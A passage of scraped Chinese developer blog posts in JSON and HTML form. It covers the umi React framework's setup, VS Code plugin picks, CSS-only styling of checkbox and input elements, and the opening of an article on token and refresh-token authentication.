的产物是单页应用，同时单独访问每个页面又都有效，所以可以在容器模式里通过 ap 进行跳转，在线模式下又通过路由跳转。模式的自动切换，我们是借助 <a target=\"_blank\" href=\"https://link.juejin.im?target=http%3A%2F%2Fgitlab.alibaba-inc.com%2Fxteam%2Fbridgex\" rel=\"nofollow noopener noreferrer\">bridgex</a> 进行实现。</p>\n<p>&nbsp;</p>\n<p><strong>八、</strong></p>\n<p>umi 在开发体验上也算得上是呕心沥血了。</p>\n<p>首先，借助 create-react-app 的开源库，他的体验是我们的底线。像是 redbox 显示出错信息、HMR、出错点击后跳转到 IDE、ESLint 出错提示等等。</p>\n<p>此外，umi 还做了更多：</p>\n<ul>\n<li>按需编译（就算你有 100 个页面，启动也只需 5 秒）</li>\n<li>所有的配置都能自动生效（热更新或自重启）</li>\n<li>动态改 antd(-mobile) 主题</li>\n<li>dev server 断线重连</li>\n<li>配置项校验和提醒（同时出现在浏览器和控制台里）</li>\n<li>配置文件语法错误提示到行</li>\n<li>TypeScript 支持（语法提示、TSLint，连测试用例也支持用 ts 写）</li>\n<li>...</li>\n</ul>\n<p>&nbsp;</p>\n<p><strong>九、</strong></p>\n<p>什么样的项目适合用 umi ？</p>\n<p>umi 是通用方案，我能说什么类型的都适用吗？😆 好吧，我说说什么项目不适用吧。</p>\n<ul>\n<li>非 React 项目</li>\n<li>路由及其复杂，不能通过目录路由约定实现的（后续会考虑配置类型的路由）</li>\n<li>不在乎产出物性能的</li>\n<li>不关注开发体验的</li>\n<li>...</li>\n</ul>\n<p>&nbsp;</p>\n<p><strong>十、</strong></p>\n<p>有点心动了，我该如何开始 Getting Started 呢？</p>\n<p>先安装 <code>umi</code>。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">$ npm i umi -g\n\n<span class=\"hljs-comment\"># 检查版本号</span>\n$ umi -v\numi@1.0.0-rc.1\n</code></pre><p>然后新建目录并进入。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">$ mkdir myapp\n$ <span class=\"hljs-built_in\">cd</span> myapp\n</code></pre><p>启动 umi 的  dev 服务器。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">$ umi dev\n</code></pre><p>新开个 terminal，在 pages 目录下新建 page component 。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'export default () =&gt; &lt;div&gt;Index Page&lt;/div&gt;'</span> &gt; pages/index.js\n</code></pre><p>在浏览器中打开 <a target=\"_blank\" href=\"https://link.juejin.im?target=http%3A%2F%2Flocalhost%3A8000%2F\" rel=\"nofollow noopener noreferrer\">http://localhost:8000/</a>，你会看到 <code>Index Page</code> 。</p>\n<p>简单吧！</p>\n<hr>\n<p>最后，umi@1.0 将于 2 月初正式发布，敬请关注。</p>\n<hr>\n<p>相关链接：</p>\n<ul>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fumijs%2Fumi\" rel=\"nofollow noopener noreferrer\">umi@github</a></li>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fumijs.org%2F\" rel=\"nofollow noopener noreferrer\">官网</a></li>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fumijs.org%2Fdocs%2Fzh-Hans%2Fgetting-started.html\" rel=\"nofollow noopener noreferrer\">文档</a></li>\n</ul>\n<p>（完）</p>\n</div>"},{"title":"VS Code 折腾记 - (12) 春节前的最后一波插件推荐(前端/协作/主题)","avatar":"https://user-gold-cdn.xitu.io/2018/1/26/16131f8dea4459b4?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"CRPER","create_time":"2018 年 01 月 30 日","tags":["前端","React.js","GitLab","Vue.js"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h1 class=\"heading\" data-id=\"heading-0\">前言</h1>\n<p>emmm.....失业之后,只能卷铺盖回家了....待来年开春再战...</p>\n<p>回老家卖小吃...顺便学学车(考驾照),利用碎片化的时间扫荡插件....</p>\n<p>于是,这篇文章就诞生了...</p>\n<hr>\n<h1 class=\"heading\" data-id=\"heading-1\">前端</h1>\n<p><strong>调试工具</strong></p>\n<ul>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dhdg.live-html-previewer\" rel=\"nofollow noopener noreferrer\">Live HTML Previewer</a>:编辑器内实时预览 html文件</li>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dhbenl.vscode-firefox-debug\" rel=\"nofollow noopener noreferrer\">Debugger for Firefox</a>: 如标题所示,vscode 关联<code>firefox</code>进行调试,和<code>Debugger for chrome</code>一致</li>\n<li></li>\n</ul>\n<p><strong>智能提示及格式化</strong></p>\n<ul>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dquicktype.quicktype\" rel=\"nofollow noopener noreferrer\">Paste JSON as Code</a>: JSON概要快速转换为其他语言的类型格式!(quick-type)</li>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dstringham.copy-with-imports\" rel=\"nofollow noopener noreferrer\">Copy With Imports</a>: 相当牛逼的插件,复制部分引用代码自动引入相关依赖...</li>\n</ul>\n<p><strong>代码片段</strong></p>\n<ul>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Djundat95.react-native-snippet\" rel=\"nofollow noopener noreferrer\">React Native Snippet</a>: RN 代码片段</li>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Ddsznajder.es7-react-js-snippets\" rel=\"nofollow noopener noreferrer\">ES7 React/Redux/GraphQL/React-Native snippets</a>: 如标题所示,涵盖的代码片段贼丰富</li>\n</ul>\n<p><strong>高亮</strong></p>\n<ul>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dpcanella.marko\" rel=\"nofollow noopener noreferrer\">Marko Syntax Highlighting</a>: ebay 旗下<code>Marko</code>的语法高亮..挺有意思的一个类模板语言的 UI 库</li>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dadamvoss.yaml\" rel=\"nofollow noopener noreferrer\">YAML</a>: <code>yaml</code>的高亮,校验及格式化</li>\n</ul>\n<p><strong>图形化操作</strong></p>\n<ul>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DtraBpUkciP.vscode-npm-scripts\" rel=\"nofollow noopener noreferrer\">NPM-Scripts</a>: 在侧边栏可视化执行 npm 命令(项目内的 <code>package.json</code>),小巧实用</li>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DDaGhostman.vs-treeview\" rel=\"nofollow noopener noreferrer\">File Tree View</a>: 提供几个常见编程语言的函数或状态的树集合展示,可以快速点击跳转!!</li>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dlegfrey.javascript-test-runner\" rel=\"nofollow noopener noreferrer\">JavaScript Test Runner Preview\n</a>: 快速执行单元测试,支持 <code>Mocha</code> 和 <code>Jest</code></li>\n</ul>\n<p><strong>语言或框架</strong></p>\n<ul>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dfreebroccolo.reasonml\" rel=\"nofollow noopener noreferrer\">OCaml and Reason IDE</a>: 两种语言的支持,后者 facebook 出的(有兴趣的可以去了解,挺超前)</li>\n</ul>\n<hr>\n<h1 class=\"heading\" data-id=\"heading-2\">协作</h1>\n<ul>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dfatihacet.gitlab-workflow\" rel=\"nofollow noopener noreferrer\">GitLab Workflow</a>: Gitlab 的快速管理工具</li>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DMS-vsliveshare.vsliveshare\" rel=\"nofollow noopener noreferrer\">VS Live Share Preview</a>: 牛逼哄哄的插件,实时协作..目前是预览版...等正式版了再专门抽时间写一篇这个的用法</li>\n</ul>\n<hr>\n<h1 class=\"heading\" data-id=\"heading-3\">主题</h1>\n<ul>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DEliverLara.andromeda\" rel=\"nofollow noopener noreferrer\">Andromeda</a>: 风骚黄绿</li>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dzadvorny.theme-happy-hipster\" rel=\"nofollow noopener noreferrer\">Happy Hipster</a>: 清新脱俗的z主题风</li>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dmariorodeghiero.vue-theme\" rel=\"nofollow noopener noreferrer\">Vue Theme</a>: 应该有部分人喜欢这种风格...</li>\n</ul>\n<hr>\n<h1 class=\"heading\" data-id=\"heading-4\">总结</h1>\n<p>能帮到各位小伙伴的话,这文章就有意义了..\n倘若没帮到  请当做网上冲浪~~~</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/30/16146adf33a8603c?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1280\" data-height=\"991\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1280&quot; height=&quot;991&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n</div>"},{"title":"css：默认的checkbox、input、radio太丑了？我来教你改变使用纯css3改写的带动画的默认样式","avatar":"https://dn-mhke0kuv.qbox.me/pui5ANRQcNkH6EAaPTAIPuA?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"sunshine小小倩","create_time":"2017 年 05 月 14 日","tags":["CSS","前端"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><p></p><figure><img atr=\"\" class=\"lazyload inited loaded\" data-src=\"https://user-gold-cdn.xitu.io/2017/5/15/9148a62ef4d5de90b3dd92c2f73744e4?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"https://user-gold-cdn.xitu.io/2017/5/15/9148a62ef4d5de90b3dd92c2f73744e4?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\"><figcaption></figcaption></figure><p></p>\n<blockquote>\n<p>项目的github地址为： <a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fsunshine940326%2Fcss3formeledemo\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">github.com/sunshine940…</a><br>本文首发于我的个人博客，<a href=\"https://link.juejin.im?target=http%3A%2F%2Fcherryblog.site%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">cherryblog.site/</a> ；欢迎大家查看我的其他博客<br>最近在做公司后台的优化项目，拿到设计稿一看，设计师觉得默认的input、checkbox、radio太丑了，要优化，在做了几个demo之后找到了要怎么优化这些样式的方法，我优化的原则有以下几点：</p>\n</blockquote>\n<ul>\n<li>因为是在已有的项目上做优化，所以尽量在不改变原有结构的基础上进行修改</li>\n<li>input、checkbox这些大都是表单里面的元素，所以大部分跟后台有交互，保留原有属性，只增加新的class或者id</li>\n<li>只使用css3，并且其属性也都是input，当然也可以直接使用img代替，或者用div+span模拟，但是这就不叫做“优化”，而是模仿了。</li>\n<li>使用sass，只需要改变参数就可以反复多次使用<!--more-->\n</li>\n</ul>\n<h1 id=\"-\" data-id=\"heading-0\">思路</h1>\n<p>大致的原理都是使用html原生的标签元素标签<code>checkbox</code>或者<code>input</code>，在后面加上<code>label</code>标签，将一些原有的元素隐藏，然后再用css设置你想要样式，行为方面都是根据原生属性来判断，不需要使用js。所有的html代码都是</p>\n<pre><code class=\"hljs javascript\">div.container\n    input type=<span class=\"hljs-string\">\"checkbox\"</span> id=<span class=\"hljs-string\">\"checkbox\"</span> \n    label <span class=\"hljs-keyword\">for</span>=<span class=\"hljs-string\">\"checkbox\"</span>\n    div.bottom-line</code></pre><p>都是利用css的原生属性来判断用户的操作,先将原本的checkbox隐藏，然后再设置label的样式，最后设置<code>input[type=checkbox]:checked+label</code>的样式 </p>\n<h1 id=\"checkbox\" data-id=\"heading-1\">checkbox</h1>\n<h2 id=\"checkbox-demo1\" data-id=\"heading-2\">checkbox demo1</h2>\n<p>首先来看一个checkbox，实现这个动画其实很简单，只运用css就可以实现。实现的原理是绑定checkout和label,用label控制是否checked。点击label的时候改变checkbox的属性<br>    先将checkbox隐藏，然后label为一个只有border的框框，使用after和befor伪元素来实现对号的两部分。<br>    先将after和before设置宽度为width<em>0.4，height为0，设置不同的旋转角度，让befor和after合起来刚好是一个对号。<br>    然后用css动画设置使其height达到width</em>0.7和width*0.35并控制动画使其连贯播放，</p>\n<h3 id=\"html\" data-id=\"heading-3\">html</h3>\n<pre><code class=\"hljs javascript\">&lt;div <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span></span>=<span class=\"hljs-string\">\"cb-container\"</span>&gt;\n    <span class=\"xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"checkbox\"</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"checkbox\"</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">label</span> <span class=\"hljs-attr\">for</span>=<span class=\"hljs-string\">\"checkbox\"</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"cb-label\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">label</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span></code></pre><h3 id=\"scss\" data-id=\"heading-4\">scss</h3>\n<pre><code class=\"hljs javascript\">\n$checked-color: #fff;\n$checked-bg:rgb(101,141,181);\n$unchecked-color: #cfcece;\n$unchecked-bg:rgb(249,249,249);\n$checkbox-height: 100px;\n$background-color:#fff;\n$font-color:#dcdcdc;\n$duration: .4s;\n.cb-container{\n  width: 1000px;\n  text-align: center;\n  margin-top: 50px;\n}\n\nhtml, body{\n  padding:0;\n  margin:0;\n  background-color: $background-color;\n  color:$font-color;\n  font-family:'Open Sans';\n}\n#checkbox{\n  display:none;\n}\n\n.cb-label{\n  height: $checkbox-height;\n  width: $checkbox-height;\n  background: $unchecked-bg;\n  border: $checkbox-height * .1 solid $unchecked-color;\n  position: relative;\n  display: inline-block;\n  box-sizing: border-box;\n  transition: border-color ease $duration/2;\n  -moz-transition: border-color ease $duration/2;\n  -o-transition: border-color ease $duration/2;\n  -webkit-transition: border-color ease $duration/2;\n  cursor: pointer;\n  &amp;::before,&amp;::after{\n    -moz-box-sizing: border-box;\n    -webkit-box-sizing: border-box;\n    box-sizing: border-box;\n    position: absolute;\n    height: 0;\n    width: $checkbox-height * 0.2;\n    background: $checked-color;\n    display: inline-block;\n    -moz-transform-origin: left top;\n    -ms-transform-origin: left top;\n    -o-transform-origin: left top;\n    -webkit-transform-origin: left top;\n    transform-origin: left top;\n    content: '';\n    -webkit-transition: opacity ease 0.5s;\n    -moz-transition: opacity ease 0.5s;\n    transition: opacity ease 0.5s;\n  }\n  &amp;::before{\n    top:$checkbox-height * 0.76;\n    left: $checkbox-height * 0.31;\n    -moz-transform: rotate(-135deg);\n    -ms-transform: rotate(-135deg);\n    -o-transform: rotate(-135deg);\n    -webkit-transform: rotate(-135deg);\n    transform: rotate(-135deg);\n  }\n  &amp;::after {\n    top: $checkbox-height * .45;\n    left: $checkbox-height * 0;\n    -moz-transform: rotate(-45deg);\n    -ms-transform: rotate(-45deg);\n    -o-transform: rotate(-45deg);\n    -webkit-transform: rotate(-45deg);\n    transform: rotate(-45deg);\n  }\n}\ninput[type=checkbox]:checked + .cb-label,\n.cb-label.checked{\n\n  background: $checked-bg;\n  border-color:$checked-bg;\n  &amp;::after{\n    border-color:$checked-color;\n    height: $checkbox-height * .35;\n    -moz-animation: dothabottomcheck $duration/2 ease 0s forwards;\n    -o-animation: dothabottomcheck $duration/2 ease 0s forwards;\n    -webkit-animation: dothabottomcheck $duration/2 ease 0s forwards;\n    animation: dothabottomcheck $duration/2 ease 0s forwards;\n  }\n\n  &amp;::before{\n    border-color:$checked-color;\n    height: $checkbox-height * 1;\n    -moz-animation: dothatopcheck $duration ease 0s forwards;\n    -o-animation: dothatopcheck $duration ease 0s forwards;\n    -webkit-animation: dothatopcheck $duration ease 0s forwards;\n    animation: dothatopcheck $duration ease 0s forwards;\n  }\n\n}\n@-moz-keyframes dothabottomcheck{\n  0% { height: 0; }\n  100% { height: $checkbox-height *0.35; }\n}\n\n@-webkit-keyframes dothabottomcheck{\n  0% { height: 0; }\n  100% { height: $checkbox-height *0.35; }\n}\n\n@keyframes dothabottomcheck{\n  0% { height: 0; }\n  100% { height: $checkbox-height *0.35;  }\n}\n\n@keyframes dothatopcheck{\n  0% { height: 0; }\n  50% { height: 0; }\n  100% { height: $checkbox-height * 0.7; }\n}\n@-webkit-keyframes dothatopcheck{\n  0% { height: 0; }\n  50% { height: 0; }\n  100% { height: $checkbox-height * 0.7; }\n}\n@-moz-keyframes dothatopcheck{\n  0% { height: 0; }\n  50% { height: 0; }\n  100% { height: $checkbox-height * 0.7; }\n}</code></pre><p></p><figure><img atr=\"经过改变后的checkbox\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/5/14/7fb941ff068bff8c9c5793f4babaa29f?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>经过改变后的checkbox</figcaption></figure><p></p>\n<h2 id=\"checkboxdemo2\" data-id=\"heading-5\">checkboxdemo2</h2>\n<p></p><figure><img atr=\"checkboxdemo2\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/5/14/0a195d563d28f44102a0d0930b80d742?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>checkboxdemo2</figcaption></figure><p></p>\n<h2 id=\"checkboxdemo3\" data-id=\"heading-6\">checkboxdemo3</h2>\n<p></p><figure><img atr=\"checkboxdemo3\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/5/14/e84958227832714c32ddefb94a740f62?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>checkboxdemo3</figcaption></figure><p></p>\n<h2 id=\"checkboxdemo4\" data-id=\"heading-7\">checkboxdemo4</h2>\n<p></p><figure><img atr=\"checkboxdemo4\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/5/14/ce30151e6672f76e9d644cbfcddeb95f?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>checkboxdemo4</figcaption></figure><p></p>\n<h1 id=\"input\" data-id=\"heading-8\">input</h1>\n<p>input的优化源于在掘金上看到的一篇文章，效果着实小清新，于是就使用拿来主义，写了一个简易版的demo，效果如下，运用的是flex布局还有伪元素placeholder来实现的。<br></p><figure><img atr=\"input效果\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/5/14/efdca263c62b19ad82ac74cd4332f363?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>input效果</figcaption></figure><p></p>\n<ul>\n<li>输入框清除默认样式</li>\n<li>当输入框获得焦点时，输入框原本的文字向上移，并且下方蓝色的线宽度由0变为100</li>\n<li>如果没有输入内容，还变为未输入的状态<br>先贴上代码<h2 id=\"html-\" data-id=\"heading-9\">html代码</h2>\nhtml结构很简单，使用的是HTML原生的form元素input和label；在效果中的“请输入内容”这几个字不是使用的<code>placeholder</code>，而是使用的label，但是也设置有<code>placeholder</code>,只不过是把<code>placeholder</code>的透明度设置为0，因为我们需要根据<code>placeholder</code>是否显示来设置下方line的宽度和label的位置。</li>\n</ul>\n<pre><code class=\"hljs javascript\">div.input-container\n    input type=<span class=\"hljs-string\">\"input\"</span> id=<span class=\"hljs-string\">\"input\"</span> placeholder=<span class=\"hljs-string\">\"请输入内容\"</span>\n    label <span class=\"hljs-keyword\">for</span>=<span class=\"hljs-string\">\"input\"</span>\n    div.bottom-line</code></pre><p>完整html代码如下</p>\n<pre><code class=\"hljs javascript\">&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;title&gt;Title&lt;/title&gt;\n    &lt;link rel=\"stylesheet\" href=\"scss/main.css\"&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;div class=\"input-container\"&gt;\n    &lt;input type=\"input\" id=\"input\" placeholder=\"请输入内容\"&gt;\n    &lt;label for=\"input\"&gt;请输入内容&lt;/label&gt;\n    &lt;div class=\"bottom-line\"&gt;&lt;/div&gt;\n&lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;</code></pre><h2 id=\"css-\" data-id=\"heading-10\">css代码</h2>\n<p>全部的动画效果都只使用了css，但是使用的一些新特性浏览器兼容性还没有那么好，兼容到ie10.布局使用的是flex，动画效果用的是用的transform。运用伪类placeholder判断是否输入了文字，如果输入了文字下方的line宽度变为100%；label中的文字上移并且变小<br>代码如下:</p>\n<pre><code class=\"hljs javascript\">$width: 500px;\n$label-font-color: #3f4f5b;\n$label-focus-font-color: rgb(82, 97, 108);\n$border-bottom-color: #d5d5d5;\n$focus-border-color: rgb(101, 141, 181);\n$transform-top: 10px;\n$transform-time: 0.3s;\n$scale: 0.9;\n\n.input-container {\n  width: $width;\n  position: relative;\n  display: -webkit-box;\n  display: -ms-flexbox;\n  display: flex;\n  -webkit-box-orient: vertical;\n  -webkit-box-direction: reverse;\n  -ms-flex-flow: column-reverse;\n  flex-flow: column-reverse;\n  -webkit-box-align: start;\n  -ms-flex-align: start;\n  align-items: flex-start;\n  margin: 100px auto\n}\n\n.input-container input {\n  -webkit-box-ordinal-group: 11;\n  order: 10;\n  -ms-flex-order: 10;\n  outline: none;\n  border: none;\n  width: 100%;\n  padding: 10px 0;\n  font-size: 20px;\n  border-bottom: 1px solid $border-bottom-color;\n  text-indent: 10px;\n}\n\n.input-container input::-moz-placeholder {\n  opacity: 0;\n}\n\n.input-container input::-webkit-input-placeholder {\n  opacity: 0;\n}\n\n.input-container input:-ms-input-placeholder {\n  opacity: 0;\n}\n\n.input-container input, .input-container label {\n  transition: all $transform-time;\n}\n\n.input-container label {\n  -webkit-box-ordinal-group: 101;\n  -ms-flex-order: 100;\n  order: 100;\n  color: $label-font-color;\n  -webkit-transform-origin: left bottom;\n  transform-origin: left bottom;\n  -webkit-transform: translate(10px, 40px);\n  transform: translate(0px, 40px);\n}\n\n.input-container .bottom-line {\n  order: 2;\n  width: 0;\n  height: 2px;\n  background: $focus-border-color;\n  transition: all $transform-time;\n}\n\n.input-container input:focus {\n  border-bottom-color: #fff;\n}\n\n.input-container input:focus ~ div, .input-container input:not(:placeholder-shown) ~ div {\n  width: 100%\n}\n\n.input-container input:focus + label, .input-container input:not(:placeholder-shown) + label {\n  color: $label-focus-font-color;\n  -webkit-transform: translate(10px) scale($scale);\n  transform: translate(10px) scale($scale)\n}</code></pre></div>"},{"title":"Token 认证的来龙去脉","avatar":"https://avatars.githubusercontent.com/u/3953094?v=3","author":"边城","create_time":"2018 年 01 月 27 日","tags":[],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><p>不久前，我在在<a target=\"_blank\" title=\"前后端分离实践\" href=\"https://link.juejin.im?target=https%3A%2F%2Fsegmentfault.com%2Fa%2F1190000012747428\" rel=\"nofollow noopener noreferrer\">前后端分离实践</a>中提到了基于 Token 的认证，现在我们稍稍深入一些。</p>\n<p>通常情况下，我们在讨论某个技术的时候，都是从问题开始。那么第一个问题：</p>\n<h2 class=\"heading\" data-id=\"heading-0\">为什么要用 Token？</h2>\n<p>而要回答这个问题很简单——因为它能解决问题！</p>\n<p>可以解决哪些问题呢？</p>\n<ol>\n<li>Token 完全由应用管理，所以它可以避开同源策略</li>\n<li>Token 可以避免 <a target=\"_blank\" href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.cnblogs.com%2Fshanyou%2Fp%2F5038794.html\" rel=\"nofollow noopener noreferrer\">CSRF 攻击</a></li>\n<li>Token 可以是无状态的，可以在多个服务间共享</li>\n</ol>\n<p>Token 是在服务端产生的。如果前端使用用户名/密码向服务端请求认证，服务端认证成功，那么在服务端会返回 Token 给前端。前端可以在每次请求的时候带上 Token 证明自己的合法地位。如果这个 Token 在服务端持久化（比如存入数据库），那它就是一个永久的身份令牌。</p>\n<p>于是，又一个问题产生了：需要为 Token 设置有效期吗？</p>\n<h2 class=\"heading\" data-id=\"heading-1\">需要设置有效期吗？</h2>\n<p>对于这个问题，我们不妨先看两个例子。一个例子是登录密码，一般要求定期改变密码，以防止泄漏，所以密码是有有效期的；另一个例子是安全证书。SSL 安全证书都有有效期，目的是为了解决吊销的问题，对于这个问题的详细情况，<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.zhihu.com%2Fquestion%2F20803288\" rel=\"nofollow noopener noreferrer\">来看看知乎的回答</a>。所以无论是从安全的角度考虑，还是从吊销的角度考虑，Token 都需要设有效期。</p>\n<p>那么有效期多长合适呢？</p>\n<p>只能说，根据系统的安全需要，尽可能的短，但也不能短得离谱——想像一下手机的自动熄屏时间，如果设置为 10 秒钟无操作自动熄屏，再次点亮需要输入密码，会不会疯？如果你觉得不会，那就亲自试一试，设置成可以设置的最短时间，坚持一周就好（不排除有人适应这个时间，毕竟手机厂商也是有用户体验研究的）。</p>\n<p>然后新问题产生了，如果用户在正常操作的过程中，Token 过期失效了，要求用户重新登录……用户体验岂不是很糟糕？</p>\n<p>为了解决在操作过程不能让用户感到 Token 失效这个问题，有一种方案是在服务器端保存 Token 状态，用户每次操作都会自动刷新（推迟） Token 的过期时间——Session 就是采用这种策略来保持用户登录状态的。然而仍然存在这样一个问题，在前后端分离、单页 App 这些情况下，每秒种可能发起很多次请求，每次都去刷新过期时间会产生非常大的代价。如果 Token 的过期时间被持久化到数据库或文件，代价就更大了。所以通常为了提升效率，减少消耗，会把 Token 的过期时保存在缓存或者内存中。</p>\n<p>还有另一种方案，使用 Refresh Token，它可以避免频繁的读写操作。这种方案中，服务端不需要刷新 Token 的过期时间，一旦 Token 过期，就反馈给前端，前端使用 Refresh Token 申请一个全新 Token 继续使用。这种方案中，服务端只需要在客户端请求更新 Token 的时候对 Refresh Token 的有效性进行一次检查，大大减少了更新有效期的操作，也就避免了频繁读写。当然 Refresh Token 也是有有效期的，但是这个有效期就可以长一点了，比如，以天为单位的时间。</p>\n<h3 class=\"heading\" data-id=\"heading-2\">时序图表示</h3>\n<p>使用 Token 和 Refresh Token 的时序图如下：</p>\n<h4 class=\"heading\" data-id=\"heading-3\">1）登录</h4>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/27/161375750d33b4cd?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"680\" data-height=\"396\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;680&quot; 